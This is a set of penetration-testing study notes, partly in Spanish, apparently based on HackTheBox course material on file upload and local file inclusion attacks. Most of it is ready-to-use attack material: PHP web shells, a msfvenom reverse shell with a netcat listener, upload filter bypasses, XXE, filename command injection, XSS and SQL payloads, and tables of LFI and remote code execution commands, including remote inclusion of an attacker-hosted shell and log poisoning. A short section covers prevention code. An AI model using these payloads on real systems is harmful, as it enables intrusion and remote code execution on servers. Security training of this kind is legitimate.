0. Determinar que lenguaje corre en el backend del Sistema, una manera simple de determinarlo es con el archive index.ext que se puede fuzzear con la Seclist/Web-Content/we-extensions.txt. Esto no nos servira si el sitio utiliza mas de una extension web o no usa el archive index. Para esto esta la herramienta wappalyzer.

1. "Absent Validation" 
Ahora que sabemos la tecnologia del backend, por ejemplo .php, Podemos subir un archive php con una prueba como "<?php echo "Hello HTB";?>" o "<?php echo gethostname();?>" o "<?php system($_REQUEST['cmd']); ?>" y guardarlo con la extension .php

1.1. "Explotacion"
Ahora que hemos podido identificar la vulnerabilidad, la explotaremos con phpbash https://github.com/Arrexel/phpbash 

1.2. "Reverse shell"
Ahora nos tocara usar una reverse shell o desarrollarla nosotros mismos.
Existe un repertorio e webshells en https://github.com/danielmiessler/SecLists/tree/master/Web-Shells y https://github.com/pentestmonkey/php-reverse-shell. Pero Tambien esta la opcion de usar msfvenom

msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php

Nos ponemos en escucha con netcat 
nc -lvnp OUR_PORT

2. "Client-Side Validation"
2.1 "Back-end Request Modification"
A pesar de que la validacion se este hacienda en el frontend, es possible bypassearla con nuestras herramientas de Desarrollo como burpsuite. 
Podemos intentar camabiar el nombre de la extension del archive y cambiar el contenido el Content-Type por el de nuestra shell.
2.2 "Disabling Front-end Validation"
Existe otra forma de bypassear esto, pero esta vez sin burp. Es manipulando el codigo del front desde el navegador con [CTRL+SHIFT+C] para sacar el Inspector de Pagina y despues seleccionar el boton de subir archive.
Normalmente Tambien podremos ver una function de javascript la cual Podemos visualizer detalladamente si en la consola [CTRL+SHIFT+K] escribimos el nombre de la funcion. Tambien Podemos al editar el codigo, eliminar estas funciones e incluso la clase accept=".jpg,.jpeg,".png"
3.0 "Blacklist filters"
3.1 "Blacklist extension" Es possible bypasear este filtro por que hay ocaciones donde se active un pHp, ya que en la blacklist viene quizas .php, php7, .phps. Tenemos 
- Extensiones inseguras para subir archivos php https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst
- Extensiones inseguras para subir archivos .net https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP
- Seclist https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt

3.Whitelist
Al permitir unos archivos especificamente, suelen usar regex para buscar el archivo, si usamos una extension de tipo .jpeg.php, la condicion de que el formato .jpeg pasara la validacion.

Inyectar caracteres
shell.php%00.jpg, shell.aspx:.jpg, 
%20
%0a
%00
%0d0a
/
.\
.
…
:

4. Content Type
Podemos subir el archivo y modificar el request con burpsuite

MIME Type
Podemos bypasear este metodo escribiendo en las primeros bytes de extension lo que este en lista blanca o Negra.
 - Lista de primeros bytes hex de extension de archivo https://en.wikipedia.org/wiki/List_of_file_signatures

5. Limited File Uploads
En esta seccion se ven otro tipo de extensions como svg, html y xml.
Con estas se puede hacer un xss
Podemos detector el uso de archivos xml con "X-Requested-With: XMLHttpRequest"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>

Tambien es possible hacer ataques DOS escribiendo archivos en la ruta /etc/passwd por ejemplo.

Inyeccion en el nombre de archivo.

Otro tipo e ataques es la inyeccion en segmentos de codigo donde se use una operacion e Sistema como: "mv file /tmp", se podria intentar
file$(whoami).jpg o file`whoami`.jpg o file.jpg||whoami
Tambien podriamos intentar usar un XSS Payload <script>alert(window.origin);</script>
Incluso un query de sql file';select+sleep(5);--.jpg

Upload Directory Disclosure
Muchas veces no sabemos donde se estan almacenando nuestros archivos que se cargan o no temenos acceso a ellos, para eso hay tecnicas como el fuzzing para determiner el esquema de almacenamiento 

Windows-specific Attacks
Podemos usar algunas de las tecnicas especificadas anteriormente.
Uno de los ataques comunes es el uso de los caracteres reservados como (|, <, >, *, or ?), que son usadas comunmente como wildcards o comodines. Si el servidor no sanitiza correctamente las entradas podriamos intentar acceder a algun otro archivo, similar Tambien Podemos usar nombres reservados para nuestros nombres de archivo como (CON, COM1, LPT1, or NUL), lo que ocasionar[a un error ya que la aplicacion web ya que esta no tendra permisos de escribir un archivo con este nombre. Y finalmente esta la FileName Convention https://en.wikipedia.org/wiki/8.3_filename para sobreescribir archivos xistentes o referir archivos que no existen. Versiones antiguas de windows son limitadas a nombres cortos en archivos, asi que usan una tilde ~ de caracter para completer el nombre del archivo y aqui es donde Podemos tomar ventaja.
Por ejemplo, para referirnos al archivo hackthebox.txt Podemos usar HAC~.TXT o HAC~2.TXT, donde el digito representara a los archivos que haran match con la palabra HAC. Como windows sigue soportando sta conversion, Podemos escribir el archivo WEB~.CONF para sobreescribir el archivo web.conf. 

Preventing File Upload Vulnerabilities
Validacion de extension
En conclusion, se recomienda usar en el codigo el blacklist y whitelist.
Ejemplo en codigo php:
$fileName = basename($_FILES["uploadFile"]["name"]);

// blacklist test
if (preg_match('/^.+\.ph(p|ps|ar|tml)/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// whitelist test
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
    echo "Only images are allowed";
    die();
}

Content Validation
No obstante, la validacion de extension no es suficiente, asi que deberemos Tambien aplicar el filtro de Content Validation
$fileName = basename($_FILES["uploadFile"]["name"]);
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// whitelist test
if (!preg_match('/^.*\.png$/', $fileName)) {
    echo "Only PNG images are allowed";
    die();
}

// content test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!in_array($type, array('image/png'))) {
        echo "Only PNG images are allowed";
        die();
    }
}

Upload Disclosure

Se recomienda seconder el directorio de archivos cargados, como por ejemplo hacienda un script de download.php para que se cumplan las condiciones necesarias el usuario para poder descargar los archivos, esto reduce las opciones de que carguen scripts maliciosos en el Sistema.
Tambien se recomienda usar las revisions de cabeceras como:Content-Type, Content-Disposition y nosniff, guardar el nombre randomizado y guardar en base de datos el nombre sanitizado.
Otra alternativa Tambien s almacenar el rchivo en un contenedor diferente.

Mas seguridad
Una configuracion critica es deshabilitar las configuraciones que ejecuten commandos de Sistema como exec, shell_exec, system, passthru, entre otras.

Tambien se debe deshanilitar el mostrar cualquier error de Sistema.

Otras configuraciones que se pueden hacer son:
- Limitar el tamano el archivo
- Actualizar cualquier libreria usada
- Escanear cualquier archivo de contener strings maliciosos.
- Utilizar un WAF como segunda capa e seguridad

## Local File Inclusion

| **Command** | **Description** |
| --------------|-------------------|
| **Basic LFI** |
| `/index.php?language=/etc/passwd` | Basic LFI |
| `/index.php?language=../../../../etc/passwd` | LFI with path traversal |
| `/index.php?language=/../../../etc/passwd` | LFI with name prefix |
| `/index.php?language=./languages/../../../../etc/passwd` | LFI with approved path |
| **LFI Bypasses** |
| `/index.php?language=....//....//....//....//etc/passwd` | Bypass basic path traversal filter |
| `/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64` | Bypass filters with URL encoding |
| `/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]` | Bypass appended extension with path truncation (obsolete) |
| `/index.php?language=../../../../etc/passwd%00` | Bypass appended extension with null byte (obsolete) |
| `/index.php?language=php://filter/read=convert.base64-encode/resource=config` | Read PHP with base64 filter |


## Remote Code Execution

| **Command** | **Description** |
| --------------|-------------------|
| **PHP Wrappers** |
| `/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id` | RCE with data wrapper |
| `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"` | RCE with input wrapper |
| `curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"` | RCE with expect wrapper |
| **RFI** |
| `echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <LISTENING_PORT>` | Host web shell |
| `/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id` | Include remote PHP web shell |
| **LFI + Upload** |
| `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif` | Create malicious image |
| `/index.php?language=./profile_images/shell.gif&cmd=id` | RCE with malicious uploaded image |
| `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php` | Create malicious zip archive 'as jpg' |
| `/index.php?language=zip://shell.zip%23shell.php&cmd=id` | RCE with malicious uploaded zip |
| `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg` | Create malicious phar 'as jpg' |
| `/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id` | RCE with malicious uploaded phar |
| **Log Poisoning** |
| `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` | Read PHP session parameters |
| `/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E` | Poison PHP session with web shell |
| `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id` | RCE through poisoned PHP session |
| `curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'` | Poison server log |
| `/index.php?language=/var/log/apache2/access.log&cmd=id` | RCE through poisoned PHP session |


## Misc

| **Command** | **Description** |
| --------------|-------------------|
| `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287` | Fuzz page parameters |
| `ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287` | Fuzz LFI payloads |
| `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287` | Fuzz webroot path |
| `ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287` | Fuzz server configurations |
| [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)|
| [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) |
| [Webroot path wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)
| [Webroot path wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt) |
| [Server configurations wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)
| [Server configurations wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows) |


## File Inclusion Functions

| **Function** | **Read Content** | **Execute** | **Remote URL** |
| ----- | :-----: | :-----: | :-----: |
| **PHP** |
| `include()`/`include_once()` | Yes | Yes | Yes |
| `require()`/`require_once()` | Yes | Yes | No |
| `file_get_contents()` | Yes | No | Yes |
| `fopen()`/`file()` | Yes | No | No |
| **NodeJS** |
| `fs.readFile()` | Yes | No | No |
| `fs.sendFile()` | Yes | No | No |
| `res.render()` | Yes | Yes | No |
| **Java** |
| `include` | Yes | No | No |
| `import` | Yes | Yes | Yes |
| **.NET** | |
| `@Html.Partial()` | Yes | No | No |
| `@Html.RemotePartial()` | Yes | No | Yes |
| `Response.WriteFile()` | Yes | No | No |
| `include` | Yes | Yes | Yes |